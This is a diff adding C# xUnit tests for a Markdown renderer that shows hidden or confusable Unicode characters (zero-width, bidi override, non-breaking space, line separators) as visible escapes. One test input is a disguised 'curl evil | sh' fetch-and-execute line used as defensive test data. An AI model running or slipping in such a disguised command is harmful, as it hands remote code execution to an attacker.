@@ -49,6 +49,38 @@ public sealed class MarkdownTests
         Assert.False(ShownText.HasHidden(text));
     }
 
+    [Theory]
+    [InlineData("true\u00A0#; curl evil | sh", "true\\u00A0#; curl evil | sh")]
+    [InlineData("a\u200Bb", "a\\u200Bb")]
+    [InlineData("a\u202Eb", "a\\u202Eb")]
+    [InlineData("a\u0007b", "a\\u0007b")]
+    [InlineData("echo \u05D0#;\u05D1", "echo \\u05D0#;\\u05D1")]
+    [InlineData("dotnet test", "dotnet test")]
+    public void An_inline_code_span_draws_what_is_not_shown_as_escapes_and_an_ordinary_one_is_unchanged(string code, string drawn)
+    {
+        var p = Assert.IsType<MdParagraph>(Assert.Single(MarkdownModel.Parse($"Run ``{code}`` now")));
+
+        var span = Assert.Single(p.Inlines.OfType<MdText>(), t => t.Style.HasFlag(MdStyle.Code));
+        Assert.Equal(drawn, span.Text);
+    }
+
+    [Theory]
+    [InlineData("a\u0085b", "a\\u0085b")]
+    [InlineData("a\u2028b", "a\\u2028b")]
+    [InlineData("a\u2029b", "a\\u2029b")]
+    [InlineData("plain \u00A0 text", "plain \u00A0 text")]
+    public void Prose_draws_NEL_and_the_line_and_paragraph_separators_as_escapes_and_nothing_else(string prose, string drawn)
+    {
+        var p = Assert.IsType<MdParagraph>(Assert.Single(MarkdownModel.Parse(prose)));
+        Assert.Equal(drawn, string.Concat(p.Inlines.OfType<MdText>().Select(t => t.Text)));
+
+        var link = Assert.IsType<MdParagraph>(Assert.Single(MarkdownModel.Parse($"[{prose}](https://example.com)")));
+        Assert.Equal(drawn, Assert.IsType<MdLink>(Assert.Single(link.Inlines)).Text);
+
+        var image = Assert.IsType<MdParagraph>(Assert.Single(MarkdownModel.Parse($"![{prose}](https://example.com/a.png)")));
+        Assert.Equal(drawn, string.Concat(image.Inlines.OfType<MdText>().Select(t => t.Text)));
+    }
+
     [Fact]
     public void Tables_become_rows_of_cells()
     {
